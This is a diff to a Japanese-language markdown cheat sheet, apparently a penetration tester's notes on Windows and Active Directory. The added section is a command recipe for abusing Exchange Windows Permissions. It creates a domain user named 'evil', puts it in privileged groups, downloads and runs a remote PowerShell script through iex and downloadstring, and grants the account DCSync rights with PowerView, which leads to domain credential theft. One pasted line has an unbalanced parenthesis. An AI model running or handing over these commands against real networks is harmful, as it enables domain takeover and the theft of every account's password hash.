@@ -115,6 +115,18 @@ sc.exe stop dns
 sc.exe start dns
 ```
 
+## Exchange Windows Permissionsの悪用
+```bash
+net user evil Password123! /add /domain
+net group "Exchange Windows Permissions" evil /add /domain # 権限が必要
+net localgroup "Remote Management Users" evil /add
+# PowerView.ps1によるDCSync権限の付与
+$pass = convertto-securestring '<パスワード>' -asplain -force
+$cred = new-object system.management.automation.pscredential('<ドメイン>\<ユーザー>', $pass)
+iex(new-object net.webclient)).downloadstring('<URL>')
+Add-ObjectACL -PrincipalIdentity 'evil' -Credential $cred -Rights DCSync
+```
+
 ## ETWとは
 Event Tracing for Windowsの略。OSやアプリケーションの挙動をリアルタイムに監視しているカーネルレベルのシステム。  
 ETWはログに書き込まれる前に検知に加えて、イベントログにない情報も取得可能。  
